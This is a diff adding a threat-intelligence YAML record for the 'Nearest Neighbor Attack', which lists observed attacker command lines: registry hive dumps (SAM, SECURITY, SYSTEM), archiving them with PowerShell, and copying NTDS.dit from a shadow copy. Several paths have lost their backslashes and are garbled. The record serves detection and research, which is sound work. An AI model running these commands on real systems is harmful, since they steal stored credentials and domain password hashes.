@@ -1,0 +1,40 @@
+description: An attacker utilized a Nearest Neighbor Attack method to compromise infrastructure
+  in physical proximity to the target organization, chaining from one organization
+  to another using valid user credentials and living-of-the-land techniques.
+attribution: Unknown
+TTPs:
+  processes:
+  - cmd.exe
+  commandline:
+  - cipher /E /S:C:\ProgramData /B /H
+  - cipher /K
+  - cipher /R:filename
+  - cipher /P:filename.cer
+  - cipher /U /N
+  - reg save hklmsam C:ProgramDatasam.save
+  - reg save hklmsecurity C:\ProgramData\security.save
+  - reg save hklmsystem C:\ProgramData\system.save
+  - Powershell -c “Get-ChildItem C:\ProgramDatasam.save, C:ProgramDatasecurity.save, C:ProgramDatasystem.save ^| Compress-Archive -DestinationPath C:ProgramDataout.zip”
+  - vssadmin create shadow /for C:\ /quiet
+  - copy \\?GLOBALROOT\DeviceHarddiskVolumeShadowCopy1WindowsNTDSNTDS.dit [dest]
+  - copy \\?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsSystem32configSYSTEM [dest]
+  powershell: 
+  - powershell -c "& { Add-Type -Assembly 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory($path1', '$path2');}" > C:WindowsTempb2rMBPL.tmp 2>&1
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - C:\ProgramData.ntds.dit
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- cipher.exe
+authors:
+- Sean Koessel
+- Steven Adair
+- Tom Lancaster
+reference: https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/
+date_of_publication: November 22, 2024
+file_creation_date: June 18, 2025
